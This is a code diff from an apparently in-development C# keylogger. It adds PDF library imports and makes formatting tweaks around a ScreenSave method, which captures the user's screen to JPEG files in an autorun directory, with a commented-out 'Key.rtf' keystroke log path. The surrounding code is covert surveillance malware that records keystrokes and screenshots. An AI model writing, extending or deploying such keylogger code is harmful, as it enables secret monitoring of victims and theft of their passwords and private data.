@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections;
 using System.ComponentModel;
 using System.IO;
 using System.Windows;
@@ -9,6 +10,9 @@ using System.Drawing;
 using System.Windows.Interop;
 using System.Collections.Generic;
 using System.Diagnostics;
+using iTextSharp.text;
+using iTextSharp.text.pdf;
+using Font = System.Drawing.Font;
 
 
 namespace Keylogger
@@ -396,6 +400,8 @@ namespace Keylogger
         public static void ScreenSave(string numscreen)
         {
             string path = AutoRun.Path() + numscreen + ".jpg";
+           // string path = AutoRun.Path() +  "Key.rtf";
+
             bitmapsource = ScreenShot.TakeScreen();
             jpeg = new JpegBitmapEncoder();
             jpeg.Frames.Add(BitmapFrame.Create(bitmapsource));
@@ -403,7 +409,7 @@ namespace Keylogger
 
             try
             {
-                fs= new FileStream(path,FileMode.Create, FileAccess.Write);
+                fs = new FileStream(path,FileMode.Create, FileAccess.Write);
                 jpeg.Save(fs);
             }
 
@@ -420,8 +426,9 @@ namespace Keylogger
 
     }
 
-#endregion
+    #endregion
 
+   
     public enum WindowsHotKey
     {
         Alt = 0x0001,
